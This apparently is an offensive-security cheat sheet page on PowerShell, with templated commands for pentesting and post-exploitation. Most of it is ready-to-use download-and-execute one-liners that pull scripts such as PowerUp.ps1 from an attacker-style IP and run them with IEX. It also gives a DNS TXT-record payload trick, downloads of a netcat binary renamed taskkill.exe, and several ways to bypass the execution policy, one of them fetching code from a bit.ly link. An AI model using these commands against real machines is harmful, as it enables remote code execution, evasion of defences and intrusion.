---
title: Powershell guide
position: 2
description: Useful commands to use on Powershell prompts
badge: Windows
---


## Super basic

```powershell
Get-Help *  #List everything loaded
Get-Help {{ topic process }}  # List everything containing "{{ topic process }}"
Get-Help Get-Item -Full {{ topic process }}  # Get full help about a topic
Get-Help Get-Item -Examples {{ topic process }}  # List examples
Import-Module {{ modulepath modulepath }}
Get-Command -Module {{ modulename modulename }}
```

### Download & execute

```powershell
powershell "IEX(New-Object Net.WebClient).downloadString('{{ script-url http://10.10.14.9:8000/ipw.ps1 }}')"
echo IEX(New-Object Net.WebClient).DownloadString('{{ script-url http://10.10.14.9:8000/PowerUp.ps1 }}') | powershell -noprofile - #From cmd download and execute
powershell -exec bypass -c "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('{{ script-url http://10.10.14.9:8000/ipw.ps1 }}')|iex"
iex (iwr '{{ script-url 10.10.14.9:8000/ipw.ps1 }}') #From PSv3

$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','{{ script-url http://10.10.14.9:8000/ipw.ps1 }}',$false);$h.send();iex $h.responseText
$wr = [System.NET.WebRequest]::Create("{{ script-url http://10.10.14.9:8000/ipw.ps1 }}") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd(

# https://twitter.com/Alh4zr3d/status/1566489367232651264
# host a text record with your payload at one of your (unburned) domains and do this: 
powershell . (nslookup -q=txt {{ domain-record domain.txt.record.with.script }})[-1]
```

### Download

<smart-tabs variable="download-method-ps" :tabs="{'iwr': 'Invoke-WebRequest', 'wget': 'Wget', 'webclient': 'Net.WebClient', 'bitstransfer':'BitsTransfer'}">
<template v-slot:iwr>

```powershell
Invoke-WebRequest "{{ file-url http://10.10.14.2:80/taskkill.exe }}" -OutFile "{{ output taskkill.exe }}"
```

</template>
<template v-slot:wget>

```powershell
wget "{{ file-url http://10.10.14.2/nc.bat.exe }}" -OutFile "{{ output C:\ProgramData\unifivideo\taskkill.exe }}"
```

</template>
<template v-slot:webclient>

```powershell
(New-Object Net.WebClient).DownloadFile("{{ file-url http://10.10.14.2:80/taskkill.exe }}","{{ output C:\Windows\Temp\taskkill.exe }}")
```

</template>
<template v-slot:bitstransfer>

```powershell
Import-Module BitsTransfer
Start-BitsTransfer -Source "{{ file-url http://10.10.14.2:80/taskkill.exe }}" -Destination {{ output taskkill.exe }}{{ optional-flags  -Asynchronous }}
```

</template>
</smart-tabs>

## Execution policy

By default it is set to **restricted.** Main ways to bypass this policy:

```powershell
# 1º Just copy and paste inside the interactive PS console
# 2º Read en Exec
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
# 3º Read and Exec
Get-Content .runme.ps1 | Invoke-Expression
# 4º Use other execution policy
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
# 5º Change users execution policy
Set-Executionpolicy -Scope CurrentUser -ExecutionPolicy UnRestricted
# 6º Change execution policy for this session
Set-ExecutionPolicy Bypass -Scope Process
# 7º Download and execute:
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://bit.ly/1kEgbuH')"
# 8º Use command switch
Powershell -command "Write-Host 'My voice is my passport, verify me.'"
# 9º Use EncodeCommand
$command = "Write-Host 'My voice is my passport, verify me.'" $bytes = [System.Text.Encoding]::Unicode.GetBytes($command) $encodedCommand = [Convert]::ToBase64String($bytes) powershell.exe -EncodedCommand $encodedCommand
```

More can be found [here](https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/)